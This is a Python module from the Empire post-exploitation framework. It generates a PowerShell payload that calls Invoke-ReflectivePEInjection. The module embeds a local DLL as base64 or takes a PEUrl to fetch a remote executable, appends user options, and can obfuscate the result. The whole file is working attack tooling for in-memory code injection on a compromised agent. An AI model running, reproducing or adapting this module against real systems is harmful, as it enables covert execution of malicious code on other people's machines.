import base64

from empire.server.common import helpers
from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        script_end = "\nInvoke-ReflectivePEInjection"

        # check if file or PEUrl is set. Both are required params in their respective parameter sets.
        if params["File"] == "" and params["PEUrl"] == "":
            return handle_error_message("[!] Please provide a PEUrl or File")
        for option, values in params.items():
            if option.lower() != "agent":
                if option.lower() == "file":
                    if values != "":
                        try:
                            with open(values, "rb") as f:
                                dllbytes = f.read()

                            base64bytes = base64.b64encode(dllbytes).decode("UTF-8")

                            script_end = (
                                "\n$PE =  [Convert]::FromBase64String('"
                                + base64bytes
                                + "')"
                                + script_end
                            )
                            script_end += " -PEBytes $PE"

                        except Exception:
                            print(
                                helpers.color(
                                    "[!] Error in reading/encoding dll: " + str(values)
                                )
                            )
                elif option.lower() == "forceaslr":
                    if values.lower() == "true":
                        script_end += " -" + str(option)
                elif values.lower() == "true":
                    script_end += " -" + str(option)
                elif values and values != "":
                    script_end += " -" + str(option) + " " + str(values)

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
